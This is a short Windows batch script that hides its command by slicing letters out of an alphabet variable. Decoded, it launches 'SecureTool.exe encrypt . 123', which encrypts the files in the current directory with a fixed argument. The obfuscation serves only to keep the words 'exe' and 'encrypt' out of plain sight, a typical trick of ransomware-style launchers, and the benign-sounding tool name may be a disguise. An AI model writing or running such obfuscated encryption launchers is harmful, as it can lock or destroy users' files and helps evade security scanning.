@echo off & setlocal EnableDelayedExpansion
setlocal

set chars=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ


start SecureTool.%chars:~4,1%%chars:~23,1%%chars:~4,1% %chars:~4,1%%chars:~13,1%%chars:~2,1%%chars:~17,1%%chars:~24,1%%chars:~15,1%%chars:~19,1% . 123
